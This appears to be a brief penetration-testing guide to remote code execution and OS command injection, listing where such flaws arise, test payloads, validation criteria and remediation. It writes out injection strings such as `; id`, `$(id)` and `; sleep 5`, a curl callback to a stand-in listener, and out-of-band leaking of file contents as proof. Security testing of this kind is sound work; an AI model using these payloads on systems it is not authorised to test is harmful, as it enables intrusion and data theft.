# RCE / OS Command Injection
> Executing attacker-controlled commands or code on the server.

## When it applies
Inputs that reach a shell, `eval`, template compiler, deserializer, file operation, or a library that shells out (image/pdf/video processing, ping/nslookup features, archive extraction, git/ssh wrappers).

## How to test
- Command injection: append `; id`, `| id`, `$(id)`, `` `id` ``, newline-separated commands; watch for command output or a callback (`; curl http://<listener>/`).
- Blind: time-based (`; sleep 5`) or out-of-band (DNS/HTTP callback to a listener you control).
- Code injection: SSTI (see ssti skill), unsafe `eval`/`Function`, YAML/pickle deserialization (see deserialization skill).
- Argument injection: values that become CLI flags (`--output=/etc/…`, `-o`).

## How to validate
Prove code executed on the server — command output reflected back, or a confirmed out-of-band callback from the server carrying a value only it could produce (`hostname`, a file's contents). A single unexplained latency is weak; a callback or reflected output is proof.

## Remediation
Never pass user input to a shell; use exec APIs with arg arrays and no shell; strict allowlists; sandbox media/deserialization; drop privileges.
